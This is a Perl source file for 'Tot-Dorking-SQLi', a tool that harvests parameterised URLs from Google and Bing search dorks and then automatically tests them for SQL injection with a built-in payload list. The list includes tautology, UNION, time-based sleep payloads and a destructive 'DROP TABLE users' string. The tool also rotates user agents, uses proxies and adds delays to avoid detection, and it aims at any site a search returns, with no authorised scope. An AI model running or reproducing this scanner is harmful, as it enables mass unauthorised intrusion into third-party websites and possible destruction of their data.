#!/usr/bin/perl

#####################################
# Tot-Dorking-SQLi : v2.1.0         #
# Autor: GagalTotal666              #
# Enhanced SQLi Detection           #
#####################################
# Copyright 2017-2026 GagalTotal666 #
#####################################

#########################################################################
##                GagalTotal666 And GhostGTR666                        ##
#########################################################################

use strict;
use warnings;
use Term::ANSIColor;

$| = 1;
$SIG{'INT'} = \&Interrupt;

use HTTP::Request;
use LWP::UserAgent;
use LWP::Protocol::https;

use Benchmark;
use POSIX;
use threads;
use threads::shared;
use Time::HiRes "usleep";
use URI::Escape;

my ($lang, %Lang, @en, @in);

$ENV{'LANG'} = $ENV{'LANG'} || 'en_US';
if ($ENV{'LANG'} =~ /^(\w*)_.*$/) {
    if($1 eq 'in'){
        $lang = 'in';
    }
    elsif($1 eq 'en'){
        $lang = 'en';
    }
    else{
        $lang = 'en';
    }
} else {
    $lang = 'en';
}

@en = (
    'Use googleDork',
    'Use bingDork',
    'Specify List of Dork links',
    'Specify Page',
    'Save Results To File',
    'Use Proxy',
    'detected traffic "unusual" the IP',
    'change it to continue [(C)hange a Bing/(Q)remove/Continue[Enter]]',
    'Continue...',
    'Scanning Completed',
    'vulnerabilities',
    'Can not write to file',
    'Specify another file:',
    "\n\n1) Change proxy\n2) Change dork\n3) Change user agent\n4) Add delay\n5) Leave\n\n\$> ",
    'New proxy',
    'New dork',
    'New user agent',
    'Delay in seconds',
    'Finish',
    'Invalid option',
    'Getting links...',
    'You can only use one search engine at a time!',
    'Scanning',
    'There are no vulnerabilities',
    'Advanced SQLi Detection Enabled',
    'Using proxy',
    'Testing SQLi payloads',
    'Potential SQLi found',
    'Time-based detection',
    'Error-based detection',
    'Boolean-based detection',
    'Testing parameter',
    'Thread'
);

@in = (
    'Gunakan googleDork',
    'Gunakan bingDork',
    'Tentukan Daftar link Dork',
    'Tentukan Halaman',
    'Simpan Hasil ke File',
    'Gunakan proxy',
    'Mendeteksi lalu lintas yang "tidak biasa" IP ',
    'Mengubahnya untuk melanjutkan [(C) hange Bing / (Q) menghapus / Lanjutkan [Enter]]',
    'Terus...',
    'Scanning Selesai',
    'Kerentanan',
    'Tidak bisa menulis ke file',
    'Tentukan file lain:',
    "\n\n1) Ubah Proxy\n2) Ganti dork\n3) Ganti user agent\n4) Tambah delay\n5) Tinggalkan\n\n\$>",
    'Proxy yang baru',
    'Dork New',
    'User agent baru',
    'Delay dalam detik',
    'Selesai',
    'Pilihan tidak valid',
    'Mendapatkan link...',
    'Anda hanya dapat menggunakan satu mesin pencari pada suatu waktu! ',
    'Scanning',
    'Tidak ada kerentanan',
    'Deteksi SQLi Lanjutan Diaktifkan',
    'Menggunakan proxy',
    'Menguji payload SQLi',
    'SQLi potensial ditemukan',
    'Deteksi berbasis waktu',
    'Deteksi berbasis error',
    'Deteksi berbasis boolean',
    'Menguji parameter',
    'Thread'
);

%Lang = (
    'in' => \@in,
    'en' => \@en
);

my @UserAgents = (
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36'
);

my @SQLiPayloads = (
    "'", 
    "''", 
    "`", 
    "\"", 
    "' OR '1'='1", 
    "' OR 1=1--", 
    " OR 1=1", 
    "' UNION SELECT NULL--", 
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
    "' OR IF(1=1,SLEEP(5),0)--",
    "' WAITFOR DELAY '00:00:05'--",
    "') OR ('1'='1",
    "'; DROP TABLE users;--",
    "' OR EXISTS(SELECT * FROM information_schema.tables)--",
    "' OR (SELECT COUNT(*) FROM sysobjects)>0--",
    "' OR (SELECT COUNT(*) FROM mysql.user)>0--"
);

our ($Dork,$BingDork,$List,$NumPages,$FileLinks,$Proxy,$UserAgent,$Delay,$Verbose,$RestAPI);
my @ProTime :shared;
my $ThreadCount :shared = 0;
my $MaxThreads = 5;

sub GetOptions(){
    for(my $i = 0;$i <= $#ARGV;$i++){
        if($ARGV[$i] eq '-h' || $ARGV[$i] eq '--help'){
            gunakan()
        }
        elsif($ARGV[$i] eq '-g' || $ARGV[$i] eq '--google'){
            $i++;
            if($i > $#ARGV){
                &gunakan("$Lang{$lang}[0]\n");
            }
            $Dork = $ARGV[$i];
        }
        elsif($ARGV[$i] eq '-b' || $ARGV[$i] eq '--bing'){
            $i++;
            if($i > $#ARGV){
                &gunakan("$Lang{$lang}[1]\n");
            }
            $BingDork = $ARGV[$i];
        }
        elsif($ARGV[$i] eq '-l'  || $ARGV[$i] eq '--list'){
            $i++;
            if($i > $#ARGV){
                &gunakan("$Lang{$lang}[2]\n");
            }
            $List = $ARGV[$i];
        }
        elsif($ARGV[$i] eq '-p'  || $ARGV[$i] eq '--pages'){
            $i++;
            if($i > $#ARGV){
                &gunakan("$Lang{$lang}[3]\n");
            }
            $NumPages = $ARGV[$i];
        }
        elsif($ARGV[$i] eq '-f'  || $ARGV[$i] eq '--file'){
            $i++;
            if($i > $#ARGV){
                &gunakan("$Lang{$lang}[4]\n");
            }
            $FileLinks = $ARGV[$i];
        }
        elsif($ARGV[$i] eq '--proxy'){
            $i++;
            if($i > $#ARGV){
                &gunakan("$Lang{$lang}[5]\n");
            }
            $Proxy = $ARGV[$i];
        }
        elsif($ARGV[$i] eq '--user-agent'){
            $i++;
            if($i > $#ARGV){
                &gunakan("Specify user agent\n");
            }
            $UserAgent = $ARGV[$i];
        }
        elsif($ARGV[$i] eq '--delay'){
            $i++;
            if($i > $#ARGV){
                &gunakan("Specify delay between requests\n");
            }
            $Delay = $ARGV[$i];
        }
        elsif($ARGV[$i] eq '--threads'){
            $i++;
            if($i > $#ARGV){
                &gunakan("Specify number of threads\n");
            }
            $MaxThreads = $ARGV[$i];
        }
        elsif($ARGV[$i] eq '-v' || $ARGV[$i] eq '--verbose'){
            $Verbose = 1;
        }
        elsif($ARGV[$i] eq '--api' || $ARGV[$i] eq '--rest-api'){
            $RestAPI = 1;
        }
    }
}

sub gunakan(){
    print $_[0] if $_[0];

if($lang eq 'in'){
    die <<EOTXT;
\r████████╗ ██████╗ ████████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗███╗   ██╗ ██████╗     ███████╗ ██████╗ ██╗     ██╗
\r╚══██╔══╝██╔═══██╗╚══██╔══╝    ██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║████╗  ██║██╔════╝     ██╔════╝██╔═══██╗██║     ██║
\r   ██║   ██║   ██║   ██║       ██║  ██║██║   ██║██████╔╝█████╔╝ ██║██╔██╗ ██║██║  ███╗    ███████╗██║   ██║██║     ██║
\r   ██║   ██║   ██║   ██║       ██║  ██║██║   ██║██╔══██╗██╔═██╗ ██║██║╚██╗██║██║   ██║    ╚════██║██║▄▄ ██║██║     ██║
\r   ██║   ╚██████╔╝   ██║       ██████╔╝╚██████╔╝██║  ██║██║  ██╗██║██║ ╚████║╚██████╔╝    ███████║╚██████╔╝███████╗██║
\r   ╚═╝    ╚═════╝    ╚═╝       ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝

\r============================================== Version V.2.1.0 ======================================================
\r=====================================  Gagaltotal666 | GhostGTR666   ================================================
\r========================================     gagaltotal.github.io ===================================================

\rgunakan: $0 [-g/b <dork>] [-p <page>] [-l <links.txt>] [-f <pages_found>] [--proxy <proxy>] [--user-agent <ua>] [--delay <seconds>] [--threads <count>] [--verbose] [--api]

  -g <Dork>
      Google Dork Pencarian
  -b <Bing>
      Bing Dork Pencarian
  -p <page>
      Jumlah Hasil Pencarian Untuk Cari Melalui
  -l <links.txt>
      Tentukan Daftar halaman untuk Dork - satu per baris
  -f <pages_found>
      Halaman Ditemukan Log
  --proxy <proxy>
      Tentukan Server Proxy
  --user-agent <ua>
      Tentukan User Agent
  --delay <seconds>
      Delay antara requests (untuk menghindari deteksi)
  --threads <count>
      Jumlah thread maksimal (default: 5)
  --verbose
      Aktifkan mode verbose (menampilkan detail proses)
  --api / --rest-api
      Aktifkan pencarian endpoint REST API

Contoh Pemakaian: $0 -b inurl:product.php?id= -p 6 --delay 2
                  $0 -g inurl:product.php?id= -p 2 --proxy http://proxy:8080 --verbose
                  $0 -g inurl:product.php?id= -p 1 -f link-vlunSQL.txt --api
                  $0 -l links.txt --delay 1

untuk informasi contoh: perldoc $0
EOTXT

}

else{
    die <<EOTXT;
\r████████╗ ██████╗ ████████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗███╗   ██╗ ██████╗     ███████╗ ██████╗ ██╗     ██╗
\r╚══██╔══╝██╔═══██╗╚══██╔══╝    ██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║████╗  ██║██╔════╝     ██╔════╝██╔═══██╗██║     ██║
\r   ██║   ██║   ██║   ██║       ██║  ██║██║   ██║██████╔╝█████╔╝ ██║██╔██╗ ██║██║  ███╗    ███████╗██║   ██║██║     ██║
\r   ██║   ██║   ██║   ██║       ██║  ██║██║   ██║██╔══██╗██╔═██╗ ██║██║╚██╗██║██║   ██║    ╚════██║██║▄▄ ██║██║     ██║
\r   ██║   ╚██████╔╝   ██║       ██████╔╝╚██████╔╝██║  ██║██║  ██╗██║██║ ╚████║╚██████╔╝    ███████║╚██████╔╝███████╗██║
\r   ╚═╝    ╚═════╝    ╚═╝       ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝
                                                                                                                      
\r============================================== Version V.2.1.0 ======================================================
\r=====================================  Gagaltotal666 | GhostGTR666   ================================================
\r========================================     gagaltotal.github.io ===================================================

\rUse: $0 [-g/b <dork>] [-p <pages>] [-l <links.txt>] [-f <pages_found>] [--proxy <proxy>] [--user-agent <ua>] [--delay <seconds>] [--threads <count>] [--verbose] [--api]

  -g <Dork>
      Google Dork Search
  -b <Bing>
      Bing Dork Search
  -p <page>
      Number of Search Results Pages to Scan
  -l <links.txt>
      Specify List of pages to Dork - one per line
  -f <pages_found>
      Found Pages Log
  --proxy <proxy>
      Specify Proxy Server
  --user-agent <ua>
      Specify User Agent
  --delay <seconds>
      Delay between requests (to avoid detection)
  --threads <count>
      Maximum number of threads (default: 5)
  --verbose
      Enable verbose mode
  --api / --rest-api
      Enable REST API endpoint search

Example Usage: $0 -b inurl:product.php?id= -p 6 --delay 2
               $0 -g inurl:product.php?id= -p 2 --proxy http://proxy:8080 --verbose
               $0 -g inurl:product.php?id= -p 1 -f link-vlunSQL.txt --api
               $0 -l links.txt --delay 1

For more information: perldoc $0
EOTXT
}
}

sub LinksByDork(){
    my @Links;
    
    $Dork ||= '';
    $BingDork ||= '';
    
    my $Pages = $Dork ? 0 : 1;
    my ($carga,$porcentaje) = ("",0);

    print "Dork: $Dork$BingDork\n";
    print "Using proxy: $Proxy\n" if $Proxy;
    print "User Agent: $UserAgent\n" if $UserAgent;
    print color('cyan') . "Verbose mode: Enabled\n" . color('reset') if $Verbose;
    print color('cyan') . "REST API search: Enabled\n" . color('reset') if $RestAPI;

    $BingDork =~ s/ /\+/g if $BingDork;
    $Dork =~ s/ /\+/g if $Dork;
    $BingDork = uri_escape($BingDork) if $BingDork;
    $Dork = uri_escape($Dork) if $Dork;

    foreach(my $pag = 0;$pag <= $NumPages;$pag++){
        my ($HTML,$Link,@Data);

        my $persen = $porcentaje < 100 ? ceil($porcentaje) : floor($porcentaje);
        $persen = 100 if $persen > 100;
        
        printf("\r[%-50s] %3i%%",$carga, $persen);
        $porcentaje += (100/$NumPages);
        $carga = "=" x ($porcentaje < 100 ? ceil($porcentaje)/2 : floor($porcentaje)/2);

        if($Dork){
            my @Nav = &Navegar('https://www.google.com/search?q='.$Dork.'&start='.$Pages.'&num=100');
            $HTML = $Nav[4] || '';
            push(@ProTime,$Nav[3]) if defined $Nav[3];
        }
        elsif($BingDork){
            my @Nav = &Navegar('https://www.bing.com/search?q='.$BingDork.'&first='.$Pages.'&count=50');
            $HTML = $Nav[4] || '';
            push(@ProTime,$Nav[3]) if defined $Nav[3];
        }

        if($HTML =~ m/Our systems have detected unusual traffic from your computer/i || $HTML =~ m/recaptcha/i){
            $HTML =~ /IP address\: (\S+)\<br/i;
            my $ip = $1 || 'Unknown';
            print "\r$Lang{$lang}[6] $ip\n$Lang{$lang}[7] ";
            chomp(my $CQ = <STDIN>);

            if($CQ =~ /^q$/i){
                if($#Links > 0){
                    @Links = &EliminarRep(@Links);
                    return @Links
                }else{exit}
            }
            elsif($CQ =~ /^c$/i){
                $BingDork = $Dork;
                $Dork = 0;
                $Pages += 1;
                my @Nav = &Navegar('https://www.bing.com/search?q='.$BingDork.'&first='.$Pages);
                $HTML = $Nav[4] || '';
            }
            else{
                print "$Lang{$lang}[8]\n";
                $pag--;next
            }
        }

        if($Dork){
            @Data = $HTML =~ m/<a href="\/url\?q=([^"]+)[^>]*>/gi;
        }
        elsif($BingDork){
            @Data = $HTML =~ /<h3><a href="([-.:%?=&\/\w]+)"/mgi;
        }

        if($#Data <= 0){
            @Data = $HTML =~ m/<a href="(http[^"]+)"[^>]*><h3/gi;
        }

        if($#Data <= 0){
            printf("\r[%-50s] %3i%%","=" x 50,100);last
        }

        foreach $Link(@Data){
            my $is_api = 0;
            if($RestAPI && ($Link =~ m/\/api\//i || $Link =~ m/\/rest\//i || $Link =~ m/\/v\d+\//i || $Link =~ m/\/json\//i)){
                $is_api = 1;
            }

            if($Link !~ m/google\./i && $Link !~ m/bing\./i && $Link !~ m/msn\./i && 
               ($Link =~ m/\%3f\S+%3d\S+/i || $Link =~ /\?\S+=\S+/ || $Link =~ /\.php\?/i || 
                $Link =~ /\.asp\?/i || $Link =~ /\.aspx\?/i || $Link =~ /\.jsp\?/i || $is_api)){
                
                $Link =~ s/\&amp\;/\&/g;
                $Link =~ s/%3f/?/gi;
                $Link =~ s/%3d/=/gi;
                $Link =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
                $Link =~ s/^https:\/\//http:\/\//g;

                if ($is_api && $Link !~ /\?/) {
                    $Link .= "?id=1";
                    print color('blue') . "[VERBOSE] REST API endpoint found (added test param): $Link" . color('reset') . "\n" if $Verbose;
                }

                push(@Links,$Link);
            }
        }
        $Pages += $Dork ? 10 : 1;
        
        sleep($Delay) if $Delay;
    }

    print "\n\n";

    @Links = &EliminarRep(@Links);

    return @Links
}

sub LinksByList(){
    my @Links;
    $NumPages = 10 unless $NumPages;

    open(LIST,"<$List") or die "Cannot open $List: $!";

    while(<LIST>){
        chomp;
        next unless $_;

        foreach my $search(("","inurl:php?id=","inurl:asp?id=","inurl:aspx?id=")){
            $Dork = "site:$_ $search";
            my @found = LinksByDork();
            push(@Links, @found) if @found;
            last if $#Links > 50;
        }
    }

    close(LIST);

    return @Links
}

sub Navegar(){
    my $URL      = $_[0];
    my $TimeOut  = $_[1] || 30;

    my $Data = '';
    my @time;

    my ($UA,$Req,$Resp,$Contenido);

    $UA = LWP::UserAgent->new;
    $UA->agent($UserAgent || $UserAgents[int(rand($#UserAgents+1))]);
    $UA->timeout($TimeOut);
    $UA->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0x00);

    if($Proxy){
        $UA->proxy(['http', 'https'], $Proxy);
    }

    my $host = '';
    if ($URL =~ /^https?\:\/\/([\w\.\-]+)\/*/) {
        $host = $1;
    }
    $UA->default_header('Host' => $host) if $host;
    $UA->default_header('Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
    $UA->default_header('Accept-Language' => 'en-US,en;q=0.5');
    $UA->default_header('Accept-Encoding' => 'gzip, deflate');
    $UA->default_header('DNT' => '1');
    $UA->default_header('Connection' => 'close');
    $UA->default_header('Upgrade-Insecure-Requests' => '1');

    if ($Verbose) {
        print color('blue') . "[VERBOSE] Requesting: $URL" . color('reset') . "\n";
    }

    eval {
        local $SIG{'ALRM'} = sub { die "TimeOut" };
        alarm $TimeOut;

        $time[0] = new Benchmark;

        $Req = HTTP::Request->new(GET => $URL);
        $Resp = $UA->request($Req);

        $time[1] = new Benchmark;
        $time[2] = ${timediff($time[1],$time[0])}[0];
        alarm 0;
    };

    alarm 0;

    if ($@ && $@ =~ /TimeOut/) {
        return (0,"Time Out");
    } elsif ($@) {
        return (0,"Fail");
    }
    
    return (0,"Fail") unless($Resp && $Resp->is_success);

    if ($Verbose && $Resp) {
        print color('blue') . "[VERBOSE] Response: " . $Resp->code . " " . $Resp->message . " | Time: $time[2]s" . color('reset') . "\n";
    }

    my @Return = (1,"20x OK",0,"$time[2].0",0);

    $Return[2] = $Resp->header('Server') if $Resp->header('Server');
    $Return[4] = $Resp->content();

    return @Return;
}

sub SQL(){
    my $Link = $_[0];
    
    {
        lock $ThreadCount;
        $ThreadCount++;
        print color('yellow') . "[$Lang{$lang}[33] $ThreadCount] Testing: $Link" . color('reset') . "\n";
    }

    my $LinkMod;
    my @HTML = (0) x 3;

    my @Edit      = split('\?',$Link, 2);
    return 0 unless $#Edit == 1;

    my @Variables = split('&',$Edit[1]);
    my %Vars      = map { my @p = split('=',$_,2); @p == 2 ? @p : ($_, '') } @Variables;

    foreach my $Var(keys %Vars){
        print color('cyan') . "[$Lang{$lang}[32]] $Link?$Var=..." . color('reset') . "\n";
        
        for my $payload (@SQLiPayloads) {
            print color('magenta') . "[VERBOSE] Testing parameter '$Var' with payload: $payload" . color('reset') . "\n" if $Verbose;
            $LinkMod = &ModLink($Edit[0],\@Variables,$Var,$payload);

            my @Nav = &Navegar($LinkMod);
            unless($Nav[0]){ next }
            
            $HTML[0] = $Nav[4] || '';
            my $response_time = $Nav[3] || 0;

            if($HTML[0] =~ m/You have an error in your SQL syntax/i ||
               $HTML[0] =~ m/Supplied argument is not a valid MySQL/i ||
               $HTML[0] =~ m/ORA-[0-9]{5}/i ||
               $HTML[0] =~ m/Microsoft OLE DB Provider/i ||
               $HTML[0] =~ m/Unclosed quotation mark/i ||
               $HTML[0] =~ m/Incorrect syntax/i) {
                
                print color('green') . "[$Lang{$lang}[28]] $Link?$Var=$payload" . color('reset') . "\n";
                my @Ret = ($Link,$Var,$payload,$response_time,"Error-based");
                return \@Ret;
            }

            my $tmp = 0;
            my $aumento = 0;
            $tmp += $_ foreach(@ProTime);
            $tmp = int($tmp/($#ProTime+1)) if @ProTime;
            $tmp ||= 1;
            $aumento = $response_time >= ($tmp+3) ? 10 : 5;

            if($payload =~ /sleep\((\d+)\)/i) {
                my $sleep_time = $1;
                if($response_time >= $sleep_time) {
                    print color('green') . "[$Lang{$lang}[27]] $Link?$Var=$payload" . color('reset') . "\n";
                    my @Ret = ($Link,$Var,$payload,$response_time,"Time-based");
                    return \@Ret;
                }
            }

            my @NavOriginal = &Navegar($Link);
            if($NavOriginal[0]) {
                my $original_content = $NavOriginal[4] || '';
                my $test_content = $HTML[0] || '';
                
                if($test_content ne $original_content && 
                   (length($test_content) != length($original_content) ||
                   $test_content =~ /different.*result/i)) {
                    
                    print color('green') . "[$Lang{$lang}[29]] $Link?$Var=$payload" . color('reset') . "\n";
                    my @Ret = ($Link,$Var,$payload,$response_time,"Boolean-based");
                    return \@Ret;
                }
            }
        }
    }

    {
        lock $ThreadCount;
        $ThreadCount--;
    }
    
    return 0;
}

sub ModLink(){
    my $Host      = $_[0];
    my @Variables = @{$_[1]};
    my $Var       = $_[2];
    my $Code      = $_[3];

    my %Vars = map { my @p = split('=',$_,2); @p == 2 ? @p : ($_, '') } @Variables;

    my $LinkMod = $Host.'?';

    foreach (keys %Vars){
        if($Var eq $_){$LinkMod .= "$_=".uri_escape($Vars{$_}.$Code)."&";}
        else{$LinkMod .= "$_=".uri_escape($Vars{$_})."&";}
    }
    chop($LinkMod);
    return $LinkMod;
}

sub EliminarRep(){
    my @Links = @_;
    my %seen;
    my @unique;

    foreach my $link (@Links) {
        my $norm_link = $link;
        $norm_link =~ s/^https?:\/\///;
        $norm_link =~ s/\/$//;
        
        unless ($seen{$norm_link}++) {
            push @unique, $link;
        }
    }

    return @unique;
}

sub Show(){
    my @LinkSQLi = @{$_[1]};
    my @t = @{$_[0]};
    my @c = ("\e[0;32m","\e[1;32m");
    my $nc = 0;

    if($^O eq "linux"){
        printf("\n" x 2);
        printf("+%s+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]),"-" x ($t[3]));
        printf("|\e[0;33mLink%s\e[0m|\e[0;33mVar%s\e[0m|\e[0;33mPayload%s\e[0m|\e[0;33mType%s\e[0m|\n"," " x ($t[0]-4)," " x ($t[1]-3)," " x ($t[2]-7)," " x ($t[3]-4));
        printf("+%s+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]),"-" x ($t[3]));
        foreach my $l(@LinkSQLi){
            printf("|$c[$nc % 2]%-${t[0]}s\e[0m|$c[$nc % 2]%-${t[1]}s\e[0m|$c[$nc % 2]%-${t[2]}s\e[0m|$c[$nc % 2]%-${t[3]}s\e[0m|\n",$$l[0],$$l[1],$$l[2],$$l[4]);
            $nc++;
        }
        printf("+%s+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]),"-" x ($t[3]));
        system("notify-send \"SQLi Dorking\" \"$Lang{$lang}[9] ".($#LinkSQLi+1)." $Lang{$lang}[10]\" -t 10000");
    }
    else{
        printf("\n" x 2);
        printf("+%s+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]),"-" x ($t[3]));
        printf("|Link%s|Var%s|Payload%s|Type%s|\n"," " x ($t[0]-4)," " x ($t[1]-3)," " x ($t[2]-7)," " x ($t[3]-4));
        printf("+%s+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]),"-" x ($t[3]));
        foreach my $l(@LinkSQLi){
            printf("|%-${t[0]}s|%-${t[1]}s|%-${t[2]}s|%-${t[3]}s|\n",$$l[0],$$l[1],$$l[2],$$l[4]);
        }
        printf("+%s+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]),"-" x ($t[3]));
    }

    if($^O eq "MSWin32"){
        system("msgbox * \"$Lang{$lang}[9] ".($#LinkSQLi+1)." $Lang{$lang}[10]\"");
    }
}

sub Logs(){
    if(open(LOGS,">>${$_[0]}")){
        print LOGS "$_[1]\n";
        close(LOGS);
    }
    else{
        print "$Lang{$lang}[11] '${$_[0]}' $!";
        print "$Lang{$lang}[12] ";
        chomp(${$_[0]} = <STDIN>);
    }
}

sub Interrupt(){
    print $Lang{$lang}[13];
    chomp(my $resp = <STDIN>);

    if($resp == 1){print "$Lang{$lang}[14]";chomp($Proxy = <STDIN>)}
    elsif($resp == 2){print "$Lang{$lang}[15]";chomp($Dork = <STDIN>)}
    elsif($resp == 3){print "$Lang{$lang}[16]";chomp($UserAgent = <STDIN>)}
    elsif($resp == 4){print "$Lang{$lang}[17]";chomp($Delay = <STDIN>)}
    elsif($resp == 5){print "$Lang{$lang}[18]\n";exit}
    else{print "$Lang{$lang}[19]\n";}
}

sub main(){
    my @Links;

    my @LinkSQLi;
    my @t = (4,8,10,12);

    GetOptions();

    print "$Lang{$lang}[24]\n";
    print "$Lang{$lang}[20]";
    print color('cyan') . "Verbose mode enabled\n" . color('reset') if $Verbose;
    print color('cyan') . "REST API endpoint search enabled\n" . color('reset') if $RestAPI;

    if($Dork){
        gunakan() unless $NumPages;
        if($BingDork){
            print "\r$Lang{$lang}[21]\n";
            gunakan();
        }
        print "\n";@Links = LinksByDork();
    }
    elsif($BingDork){
        gunakan() unless $NumPages;
        if($Dork){
            print "\r$Lang{$lang}[21]\n";
            gunakan();
        }
        print "\n";@Links = LinksByDork();
    }
    elsif($List){ print "\n";@Links = LinksByList() }
    else{ gunakan }

    print "$Lang{$lang}[22] ".($#Links+1)." links...\n" if $#Links > 0;

    my @threads;
    foreach my $link (@Links) {
        while(1) {
            {
                lock $ThreadCount;
                last if $ThreadCount < $MaxThreads;
            }
            sleep(1);
        }

        my $thr = threads->create(\&SQL, $link);
        push @threads, $thr;
        
        sleep($Delay/2) if $Delay;
    }

    foreach my $thr (@threads) {
        my $Datos = $thr->join();
        if($Datos){
            foreach(0..3){
                $t[$_] = length($$Datos[$_]) if($t[$_] < length($$Datos[$_]));
            }
            &Logs(\$FileLinks,"Link: $$Datos[0] Var: $$Datos[1] Payload: $$Datos[2] Type: $$Datos[4]") if $FileLinks;
            push(@LinkSQLi,$Datos);
        }
    }

    if(@LinkSQLi){ &Show(\@t,\@LinkSQLi) }
    else{ print "$Lang{$lang}[23]\n" }
}

main();

__END__

=head1 Name

Dorking-SQL

=head1 Version

Version v2.1.0

=head1 Description

Menemukan website vulnerable terhadap SQL Injection menggunakan Google/Bing dork dengan deteksi advanced